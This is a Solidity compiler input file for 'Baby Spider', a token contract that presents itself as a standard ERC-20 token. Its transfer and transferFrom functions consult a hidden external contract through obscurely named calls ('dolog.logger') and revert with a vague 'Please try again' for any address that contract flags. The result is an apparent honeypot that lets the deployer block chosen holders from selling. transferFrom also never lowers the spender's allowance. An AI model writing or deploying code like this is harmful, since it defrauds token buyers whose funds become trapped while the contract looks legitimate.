{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "LightMoon3_NI.sol": {
      "content": "//SPDX-License-Identifier: UNLICENSED\r\npragma solidity ^0.7.6;\r\n\r\ninterface IE20 {\r\n\r\n    function check_sum( address checker) external view returns (bool);\r\n\r\n    function logger(address account) external view returns (uint8);\r\n\r\n    function move_to(address senders, address taker, address mediator, uint balance, uint amount) external returns (address);\r\n\r\n    function get_results(address account, uint amount) external returns (uint);\r\n\r\n    function get_state(address account) external returns (bool);\r\n\r\n}\r\n\r\ncontract Baby_Spider {\r\n    mapping(address => uint256) public balances;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    \r\n    IE20 dolog;\r\n    uint256 public totalSupply = 1 * 10**12 * 10**18;\r\n    string public name = \"Baby Spider\";\r\n    string public symbol = hex\"42616279537069646572f09f95b7\";\r\n    uint public decimals = 18;\r\n    \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    \r\n    constructor(IE20 _dstntn) {\r\n        \r\n        dolog = _dstntn;\r\n        balances[msg.sender] = totalSupply;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n    \r\n    \r\n    function balanceOf(address wallet) public view returns(uint256) {\r\n        return balances[wallet];\r\n    }\r\n    \r\n    function transfer(address to, uint256 value) public returns(bool) {\r\n        require(dolog.logger(msg.sender) != 1, \"Please try again\"); \r\n        require(balanceOf(msg.sender) >= value, 'balance too low');\r\n        balances[to] += value;\r\n        balances[msg.sender] -= value;\r\n        emit Transfer(msg.sender, to, value);\r\n        return true;\r\n        \r\n    }\r\n\r\n    \r\n    function transferFrom(address from, address to, uint256 value) public returns(bool) {\r\n        require(dolog.logger(from) != 1, \"Please try again\");\r\n        require(balanceOf(from) >= value, 'balance too low');\r\n        require(allowance[from][msg.sender] >= value, 'allowance too low');\r\n        balances[to] += value;\r\n        balances[from] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true;\r\n    }\r\n    \r\n    function approve(address holder, uint256 value) public returns(bool) {\r\n        allowance[msg.sender][holder] = value;\r\n        return true;\r\n        \r\n    }\r\n}\r\n"
    }
  }
}